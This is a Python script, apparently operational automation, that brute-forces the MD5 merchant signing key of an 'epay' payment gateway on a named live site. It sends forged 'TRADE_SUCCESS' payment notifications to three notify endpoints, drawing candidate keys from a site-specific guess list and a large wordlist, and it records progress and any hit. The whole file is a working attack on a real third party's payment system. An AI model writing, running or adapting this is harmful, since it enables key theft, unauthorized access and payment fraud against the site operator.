#!/usr/bin/env python3
"""qq1.lol epay key turbo — asyncio multi-worker + priority dict"""
import asyncio
import hashlib
import json
import os
import sys
import time
from datetime import datetime
from pathlib import Path

import aiohttp

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/data/automation/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "epay_turbo.log"
HITS = OUT / "epay_hits.jsonl"
PROGRESS = OUT / "epay_turbo_progress.json"

WORKERS = int(os.environ.get("EPAY_WORKERS", "8"))
TRADE_NO = os.environ.get("QQ1_TRADE_NO", "20260720145603146")
PRIORITY = OUT / "epay_priority_keys.txt"
BIG = Path(os.environ.get("EPAY_DICT", "/data/wordlists/epay-keys.txt"))

ENDPOINTS = ["other/epay_notify.php", "other/alipay_notify.php", "other/qqpay_notify.php"]
PARAMS = {
    "pid": "1",
    "trade_no": TRADE_NO,
    "out_trade_no": TRADE_NO,
    "type": "alipay",
    "name": "test",
    "money": "99.00",
    "trade_status": "TRADE_SUCCESS",
}

done = 0
hit_event = asyncio.Event()
log_lock = asyncio.Lock()


def log(msg):
    line = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def epay_sign(params, key):
    items = sorted((k, v) for k, v in params.items() if k not in ("sign", "sign_type") and v != "")
    return hashlib.md5(("&".join(f"{k}={v}" for k, v in items) + key).encode()).hexdigest()


def gen_priority_keys():
    keys = set()
    base = [
        "", "123456", "123456789", "admin", "key", "secret", "epay", "mckuai", "mckuai123",
        "qq1", "buyi", "buyiq", "qqkqq", "QQKZC", "888888", "666666", "password", "faka",
        "rainbow", "syskey", "authkey", "qq1.lol", "ka1", "ka1.one", "by123456", "buyi123",
        "buyi888", "jiankong", "cron", "monitor", "alipay", "wxpay", "qqpay", "paykey",
        "merchant", "apikey", "api_key", "abcdef", "111111", "000000", "qwerty", "root",
        "test", "admin123", "admin888", "830603", "123456789s", "123123", "a123456",
    ]
    keys.update(base)
    for w in ["qq1", "buyi", "buyiq", "qqkqq", "ka1", "faka", "epay", "admin", "布衣"]:
        for s in ["", "123", "123456", "888", "666", "2024", "2025", "2026", "@123", "666666"]:
            keys.add(w + s)
            keys.add(s + w)
    PRIORITY.write_text("\n".join(sorted(keys)) + "\n")
    return PRIORITY


async def try_key(session, sem, key, line_no):
    global done
    if hit_event.is_set():
        return
    async with sem:
        data = dict(PARAMS)
        data["sign"] = epay_sign(PARAMS, key)
        data["sign_type"] = "MD5"
        for ep in ENDPOINTS:
            try:
                async with session.post(
                    f"{BASE}/{ep}",
                    data=data,
                    timeout=aiohttp.ClientTimeout(total=12),
                    headers={"User-Agent": "Mozilla/5.0", "Referer": f"{BASE}/"},
                ) as r:
                    text = (await r.text()).strip()
            except Exception:
                continue
            low = text.lower()
            if "success" in low or text in ("OK", "ok"):
                hit = {"key": key, "ep": ep, "resp": text, "line": line_no}
                log(f"*** HIT {hit}")
                HITS.write_text(json.dumps(hit) + "\n")
                hit_event.set()
                return
            if "_guard" in text:
                return  # WAF hit, skip logging spam
        done += 1
        if done % 200 == 0:
            log(f"  progress done={done} rate~{done/max(1,time.time()-start_ts):.0f}/s")


async def run_dict(path, offset=0):
    sem = asyncio.Semaphore(WORKERS)
    connector = aiohttp.TCPConnector(limit=WORKERS + 5, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        with open(path) as f:
            for i, line in enumerate(f):
                if i < offset:
                    continue
                key = line.strip()
                if not key:
                    continue
                tasks.append(asyncio.create_task(try_key(session, sem, key, i)))
                if len(tasks) >= WORKERS * 4:
                    await asyncio.gather(*tasks)
                    tasks = []
                    if hit_event.is_set():
                        return
                    PROGRESS.write_text(json.dumps({"file": str(path), "line": i}))
        if tasks:
            await asyncio.gather(*tasks)


async def main_async():
    global start_ts
    start_ts = time.time()
    gen_priority_keys()
    log(f"=== epay turbo workers={WORKERS} trade={TRADE_NO} ===")
    # phase 1: priority (~200 keys, seconds)
    await run_dict(PRIORITY)
    if hit_event.is_set():
        return
    # phase 2: big dict if exists
    if BIG.exists():
        off = 0
        if PROGRESS.exists():
            try:
                p = json.loads(PROGRESS.read_text())
                if p.get("file") == str(BIG):
                    off = p.get("line", 0)
            except Exception:
                pass
        log(f"=== big dict {BIG} offset={off} ===")
        await run_dict(BIG, off)
    log(f"=== done total={done} elapsed={time.time()-start_ts:.1f}s ===")


def main():
    asyncio.run(main_async())


if __name__ == "__main__":
    main()
